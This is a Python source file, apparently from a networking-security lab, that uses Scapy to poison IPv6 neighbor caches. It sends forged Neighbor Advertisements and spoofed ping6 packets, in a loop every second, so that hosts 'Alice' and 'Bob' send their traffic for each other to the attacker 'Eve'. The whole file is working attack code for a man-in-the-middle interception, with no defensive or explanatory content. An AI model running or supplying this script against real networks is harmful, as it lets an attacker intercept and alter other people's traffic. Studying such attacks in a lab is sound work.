from scapy.all import *
import time
from network_details import *

def build_fake_na(victim_mac, victim_ip, target_ip):
    ether = Ether(src=EVE_MAC, dst=victim_mac)
    ipv6 = IPv6(src=target_ip, dst=victim_ip)
    na = ICMPv6ND_NA(R=0,S=1,O=1,tgt=target_ip)
    dst_lladdr = ICMPv6NDOptDstLLAddr(lladdr=EVE_MAC)
    return ether / ipv6 / na / dst_lladdr


def send_fake_na(victim_mac, victim_ip, target_ip):
    fake_na = build_fake_na(victim_mac, victim_ip, target_ip)
    sendp(fake_na, verbose=0)


def build_fake_ping6(victim_mac, victim_ip, target_ip):
    ether = Ether(src=EVE_MAC, dst=victim_mac)
    ipv6 = IPv6(src=target_ip, dst=victim_ip)
    icmpv6 = ICMPv6EchoRequest(id=1,seq=1,data='hey')
    return ether / ipv6 / icmpv6


def send_fake_ping6(victim_mac, victim_ip, target_ip):
    fake_ping6 = build_fake_ping6(victim_mac, victim_ip, target_ip)
    sendp(fake_ping6, verbose=0)


def poison_alice():
    # ping6&na to alice "from bob"
    send_fake_ping6(ALICE_MAC, ALICE_IPv6, BOB_IPv6)
    send_fake_na(ALICE_MAC, ALICE_IPv6, BOB_IPv6)


def poison_bob():
    # ping&na to bob "from alice"
    send_fake_ping6(BOB_MAC, BOB_IPv6, ALICE_IPv6)
    send_fake_na(BOB_MAC, BOB_IPv6, ALICE_IPv6)


def poison():
    while True:
        poison_alice()
        poison_bob()    
        time.sleep(1)

